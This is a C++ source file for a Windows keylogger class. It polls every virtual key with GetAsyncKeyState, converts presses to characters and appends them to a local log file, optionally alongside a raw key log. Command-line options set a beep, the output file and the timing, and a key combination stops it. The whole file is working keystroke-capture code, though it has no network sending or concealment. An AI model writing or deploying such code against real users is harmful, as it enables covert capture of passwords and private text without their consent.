#include "keylogger.h"
#undef max

KeyLogger::~KeyLogger()
{
	logFile_.close();
}

KeyLogger::KeyLogger() try :
	keyMapper_{}, parameters_{} 
{
	logFile_.open(parameters_.logFilename_,
		std::fstream::out | std::fstream::app | std::fstream::ate);
	if (!logFile_.is_open()) 
		throw (0);
	if (parameters_.rawLog_) {
		rawLogFile_.open(parameters_.rawLogFilename_,
			std::fstream::out | std::fstream::app | std::fstream::ate);
		if (!rawLogFile_.is_open()) 
			throw(0);
	}	
	argHandler_.add(new BasicArg("-b", [this]()->void {parameters_.beep_ = true; }));
	argHandler_.add(new BasicArg("-r", [this]()->void {parameters_.rawLog_ = true; }));
	argHandler_.add(new StringArg("-o", '=', [this](std::string const& name)->void {parameters_.logFilename_ = name; }));
	argHandler_.add(new ValueArg<double>("-p", '=', {0,0.01}, [this](double val)->void {parameters_.processPeriod_ = val; }));
	argHandler_.add(new ValueArg<double>("-s", '=', {0.1,std::numeric_limits<double>::max()}, [this](double val)->void {parameters_.savePeriod_ = val; }));
	saveTimer_.tic();
	processTimer_.tic();
}
catch (int error) {
	throw(error);
}

bool KeyLogger::exit_shortcut_()
{
	return GetKeyState(VK_END) && shift_() && ctrl_();
}

void KeyLogger::save_()
{
	logFile_.close();
	logFile_.open(parameters_.logFilename_,
		std::fstream::out | std::fstream::app | std::fstream::ate);
}

bool KeyLogger::shift_()
{
	return
		GetAsyncKeyState(VK_SHIFT) ||
		GetAsyncKeyState(VK_LSHIFT) ||
		GetAsyncKeyState(VK_RSHIFT);
}

bool KeyLogger::ctrl_()
{
	return
		GetAsyncKeyState(VK_CONTROL) ||
		GetAsyncKeyState(VK_LCONTROL) ||
		GetAsyncKeyState(VK_RCONTROL);
}

bool KeyLogger::alt_()
{
	return
		GetAsyncKeyState(VK_MENU) ||
		GetAsyncKeyState(VK_LMENU) ||
		GetAsyncKeyState(VK_RMENU);
}

bool KeyLogger::is_mod_(size_t ch)
{
	return
		(ch>=VK_LSHIFT && ch <=VK_RMENU) ||
		(ch>=VK_SHIFT && ch<=VK_MENU);
}

bool KeyLogger::is_graphic_(size_t ch)
{
	return (ch >= 0x30  && ch <= 0x39) ||
		(ch >= 0x41  && ch <= 0x5A) ||
		(ch >= VK_NUMPAD0 && ch <= VK_DIVIDE) ||
		(ch >= VK_OEM_1  && ch <= VK_OEM_3) ||
		(ch >= VK_OEM_4  && ch <= VK_OEM_8) ||
		ch == VK_RETURN ||
		ch == VK_SPACE ||
		ch == VK_TAB;
		
}

void KeyLogger::clear_log_()
{
	logFile_.clear();
}

void KeyLogger::process_key_(size_t key)
{
	char converted;
	if (GetAsyncKeyState(key)) {
		if (!keyState[key]) {
			if (is_graphic_(key)) {
				if (converted = keyMapper_.convert(
					key, shift_(), alt_(), ctrl_())) {
					logFile_<<converted;
				}
			}
			if (parameters_.rawLog_)
				rawLogFile_<<(char)key;
			keyState[key] = true;
			if (parameters_.beep_) Beep(10+5*key, 60);
		}
	}
	else {
		keyState[key] = false;
	}
}

void KeyLogger::process()
{
	while (true) {
		for (size_t i = 0; i<256; ++i) {
			process_key_(i);
		}
		if (exit_shortcut_()) return;
		if (saveTimer_.toc()>parameters_.savePeriod_*0.001) {
			saveTimer_.tic();
			save_();
		}
		Sleep(parameters_.processPeriod_);
	}
}

//void KeyLogger::Parameters::process_param_(std::string const & param)
//{
//	if (param.size()>=2) {
//		if (param[0]=='-') {
//			char paramName = param[1];
//			if (paramName=='b') {
//				beep_ = true;
//				return;
//			}
//			if (paramName=='r') {
//				rawLog_ = true;
//				return;
//			}
//			if (paramName=='o') {
//				if (param[2]=='=') {
//					logFilename_ = param.substr(3);
//				}
//				return;
//			}
//			if (paramName=='s') {
//				if (param[2]=='=') {
//					try {
//						savePeriod_ = 1000 * std::stod(param.substr(3));
//					}
//					catch (...) {
//					}
//				}
//				return;
//			}
//			if (paramName=='p') {
//				if (param[2]=='=') {
//					try {
//						processPeriod_ = std::stod(param.substr(3));
//					}
//					catch (...) {
//					}
//				}
//				return;
//			}
//		}
//	}
//}

//void KeyLogger::Parameters::process_str_(std::string parameters)
//{
//	size_t c = 0;
//	size_t lastpos = 0;
//	while (parameters[c++]) {
//		if (parameters[c]==' ' || !parameters[c]) {
//			process_param_(parameters.substr(lastpos, c-lastpos));
//			lastpos = c+1;
//		}
//	}
//}

KeyLogger::Parameters::Parameters():
	processPeriod_{10},
	savePeriod_{10000},
	beep_{false},
	rawLog_{false},
	logFilename_{"./keylog.txt"},
	rawLogFilename_{"./rawlog"}
{
	/*process_str_(parameters);*/
}
